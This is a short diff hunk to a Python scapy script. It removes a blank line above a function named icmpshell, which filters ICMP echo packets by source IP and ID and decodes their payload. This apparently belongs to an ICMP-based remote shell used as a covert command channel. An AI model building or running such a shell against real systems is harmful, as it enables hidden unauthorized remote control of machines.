@@ -8,7 +8,6 @@ TTL = int(64)
 interface = sys.argv[1]
 destination_ip = sys.argv[2]
 
-
 def icmpshell(pkt):
     if pkt[IP].src == destination_ip and pkt[ICMP].type == 8 and pkt[ICMP].id == ICMP_ID and pkt[Raw].load:
         icmppaket = (pkt[Raw].load).decode('utf-8', errors='ignore')
